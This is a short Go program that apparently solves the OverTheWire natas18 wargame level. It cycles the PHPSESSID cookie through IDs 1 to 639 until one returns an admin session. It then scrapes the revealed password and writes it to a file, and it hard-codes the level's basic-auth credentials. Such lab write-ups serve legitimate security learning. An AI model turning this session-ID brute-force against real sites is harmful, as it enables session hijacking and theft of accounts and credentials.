package main

import "fmt"
import "io/ioutil"
import "net/http"
import "os"
import "strconv"
import "strings"

func doBruteforce(identifier int) string {

	var result string = ""

	base_url := "http://natas18.natas.labs.overthewire.org/"
	// grep ^0 auto converts buffer to binary!?
	client := &http.Client{}

	request, _ := http.NewRequest("GET", base_url, nil)
	request.Header.Add("Content-Type", "text/html")
	request.Header.Add("Cookie", "PHPSESSID=" + strconv.FormatInt(int64(identifier), 10))
	request.SetBasicAuth("natas18", "8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq")

	response, err1 := client.Do(request)

	if err1 == nil {

		body, err2 := ioutil.ReadAll(response.Body)

		if err2 == nil {

			html := string(body)

			if strings.Contains(html, "You are logged in as a regular user.") {

				// Do Nothing

			} else if strings.Contains(html, "You are an admin.") && strings.Contains(html, "Password: ") && strings.Contains(html, "</pre>") {

				tmp1 := strings.TrimSpace(html[strings.Index(html, "Password: ")+10:])
				tmp2 := strings.TrimSpace(tmp1[0:strings.Index(tmp1, "</pre>")])

				if tmp2 != "" {
					result = tmp2
				}

			}

		}

	}

	return result

}

func main() {

	for id := 1; id < 640; id++ {

		fmt.Println("Requesting PHPSESSID=" + strconv.FormatInt(int64(id), 10))

		result := doBruteforce(id)

		if result != "" {
			fmt.Println("Password is \"" + result + "\"")
			os.WriteFile("./sessions/" + strconv.FormatInt(int64(id), 10) + ".txt", []byte(result), 0666)
		}

	}

}

